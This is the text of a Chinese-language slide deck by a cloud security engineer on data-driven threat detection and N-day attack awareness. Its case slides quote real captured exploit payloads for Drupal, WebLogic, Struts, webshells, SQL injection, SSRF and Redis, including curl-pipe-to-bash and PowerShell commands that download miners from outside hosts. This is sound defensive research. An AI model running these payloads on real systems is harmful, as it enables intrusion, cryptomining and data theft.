从数据视角探索安全威胁 
阿里云安全工程师 / cdxy 
whoami 
0 
cdxy 
数据分析 / 威胁感知 
异常数据清洗 
1 
信息穿透模型 
2 
Nday感知 
3 
落地思考 
4 
目录  |   Content 
异常数据清洗 
1 
Chapter 1 
威胁感知模型基础 
异常基线A 
异常基线B 
复杂模型 
异常数据清洗的价值 
云环境威胁感知现状 
挑战 
异常数据清洗价值 
百万主机 
PB级数据 
有限的存储、计算资源 
以不损失告警为前提 
压缩数据量 
业务场景复杂 
运营资源有限 
通用性、准确率要求高 
理解业务特征 
提升告警置信度 
代码类日志清洗——词法分析 
参数类日志清洗——字符序列 
/index.php?name=cdxy/
/
/
/
/
/
/
/
/AAAA//
/index.php?name=ring04h/
/
/
/
/
/
/
/AAAADDA/
/index.php?name=/ /
/
/CAAAAAACAAAAACDCCCAAAAAAC/
Site: URI Path异常 
URI Path: Key异常 
Key: Value异常 
信息穿透模型 
2 
Chapter 2 
威胁检测产品能力对比 
检测类产品待解问题 
信息穿透模型 
高误报 
准确率99% 
依赖规则，安全能力依赖长期规则运营 
无规则模型，低运营成本 
对无危害的PoC探针行为检测能力弱 
探针行为预警 
对未知漏洞检测能力弱 
自动覆盖Nday 
仅做入侵发现 
发现+回溯 
信息穿透模型 
案例：RCE – DRUPAL 
/?/
q=user/password/
&name[#type]=markup/
&name[#markup]=curl+-s+185.234.218.53/.d/miner1.sh+|+bash/
&name[#post_render][]=passthru//
URI 
主机用户 
父进程 
命令 
sh/-c/curl/-s/185.234.218.53/.d/miner1.sh/|/bash 
/usr/sbin/httpd 
root 
案例：RCE – WEBLOGIC  
///////////////
/////////////////
C:\windows\system32\cmd.exe/
/c/
powershell.exe/-WindowStyle/Hidden/$P/=//
nEW-oBJECT/sYSTEM.nET.wEBcLIENT;$P.DownloadFile('http://
132.148.150.15:8080/miner.exe',/'C:\ProgramData\miner.exe');START/C:
\ProgramData\miner.exe/
/
/
/
/
POST Data 
案例：RCE – STRUTS OGNL 
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil
@class)).(#ognlUtil.getExcludedPackageNames().clear()).
(#ognlUtil.getExcludedClasses().clear()).
(#context.setMemberAccess(#dm))))./
(#cmd='cmd//c/netsh/firewall/set/opmode/mode=disable').
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains
('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-
c',#cmd})).(#p=new/java.lang.ProcessBuilder(#cmds)).
(#p.redirectErrorStream(true)).(#process=#p.start())./
Request-Content-Type 
案例：RCE – WEB SHELL执行命令 
/eng/query-terminal.jsp?cmd=mkdir+-p+%2Froot%2F.ssh%2F+%26%26+touch+
%2Froot%2F.ssh%2Fauthorized_keys+%26%26+chmod+600+
%2Froot%2F.ssh%2Fauthorized_keys/
URI & POST 
/upload/template/default/forum/123.php?eanver=cmd/
&cmd=d2hvYW1p/
主机用户 
父进程 
命令 
sh/-c/whoami 
php-fpm:/pool/www/ 
www 
Encoded Payload 
/wp-content/themes/sketch/404.php/
a=Php&c=&p1=system("cat//etc/passwd");/
Process Log 
案例：脚本文件上传 
------WebKitFormBoundaryrUzmdXS72dR6ZxEi/
Content-Disposition:/form-data;/name="dir"/
/
E:/www/css//
------WebKitFormBoundaryrUzmdXS72dR6ZxEi/
Content-Disposition:/form-data;/name="upfile";/filename="amazeui.php"/
Content-Type:/application/octet-stream/
/
"+into+outfile+"D:/www/images.php";/
Request Data 
File Content & Path 
案例：SQL注入 
select/id,type,letter,url/from/sl_types/where/letter='%'/AND/6405/IN/
(/(CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(/(CASE/WHEN/
(6405=6405)/THEN/CHAR(49)/ELSE/CHAR(48)/END))
+CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)))/AND/'%'=''/order/by/
sort/asc/limit/0,9/
SQL Log 
/index.php?action=listletter/
/
date=2018-06-05&letter=%25%27%20AND%206405%20IN%20%28%20%28CHAR%28113%29
+CHAR%28118%29+CHAR%28112%29+CHAR%28113%29+CHAR%28113%29+
%28%20%28CASE%20WHEN%20%286405%3D6405%29%20THEN%20CHAR%2849%29%20ELSE%20
CHAR%2848%29%20END%29%29+CHAR%28113%29+CHAR%28113%29+CHAR%28106%29+CHAR%
2898%29+CHAR%28113%29%29%29%20AND%20%27%25%27%3D%27&perPage=16&status=-1
&Submit=%E6%8F%90%E4%BA%A4/
Request Data 
案例：SSRF 
/spaces/viewdefaultdecorator.action?
decoratorName=ftp://10.0.0.1/
/
/uddiexplorer/SearchPublicRegistries.jsp?
rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSea
rchfor=&selfor=Business+location&btnSubmit=Search&ope
rator=http://10.0.42.2:7001/
Intranet Session 
Intranet Flow 
DNS 
IP连接数 
内网目标暴露 
72 
2 
Request Data 
案例：REDIS未授权访问漏洞利用 
/
ssh-rsa/
AAAAB3NzaC1yc2EAAAADAQABAAABAQDE0guChoiGr6s3mXjQA0wX6YKNNMy2bpj6b8ArjuWH/
.../
Sd4pgn4gbmb8GzAvlH2xxw+SV2h/PI:EMAIL/
/
webshellgodkey@t/
/
*/*/*/*/*/curl/-fsSL/"http://r.waterdropx.com:13858/cdp.x?
ip=115.28.176.14&xp_ht=5A089AF6&xp_s=842768"/|/bash/&/
CONFIG/SET/dir//var/www/html//
CONFIG/SET/dbfilename/redis.php/
/
TCP Flow 
File Content  
Process 
Path 
100+ 
40000+ 
99% 
攻击向量 
准确率 
已知漏洞 
模型效果 
从Nday攻击到告警的全自动化 
为Hunting提供准确完整的payload 
监控Nday及Exploit变化 
为情报、宏观态势、黑客社区发现提供数据支撑 
RCE / SSRF / SQLI 
文件操作 / 信息泄露 / webshell 
Nday感知 
Chapter 3 
3 
Nday感知 
Nday 
Exploit Library 
Alert  
发现能力 
Payload  
解释能力 
预测能力 
无需漏洞先验知识 
案例：Drupal / Hadoop RCE 云上大规模利用 
落地思考 
4 
Chapter 4 
时效性要求 
准确性要求 
运营资源 
目标数据量 
采集 / 存储 / 计算成本 
标注方法 
样本质量 
探索-假设-验证-优化 
算法接入与调优 
可复现-可解释 
迭代方案 
风险控制 
反馈机制 
场景 
数据 
运营 
数据科学落地安全产品 
场景 
数据 
模型 
运营 
Q&A 
i[at]cdxy.me 
@xyntax